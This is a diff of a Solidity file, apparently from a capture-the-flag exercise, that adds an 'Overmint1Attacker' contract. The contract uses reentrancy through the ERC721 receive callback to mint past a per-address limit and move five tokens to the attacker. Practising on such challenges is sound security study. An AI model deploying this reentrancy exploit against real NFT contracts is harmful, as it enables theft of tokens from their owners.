@@ -21,3 +21,32 @@ contract Overmint1 is ERC721 {
         return balanceOf(_attacker) == 5;
     }
 }
+
+contract Overmint1Attacker is IERC721Receiver {
+    Overmint1 targetContract;
+    address attacker;
+
+    constructor(address _targetContract) {
+        targetContract = Overmint1(_targetContract);
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+        targetContract.mint();
+        for (uint256 i = 1; i <= 5; ++i) {
+            targetContract.transferFrom(address(this), attacker, i);
+        }
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        if (targetContract.totalSupply() < 5) {
+            targetContract.mint();
+        }
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
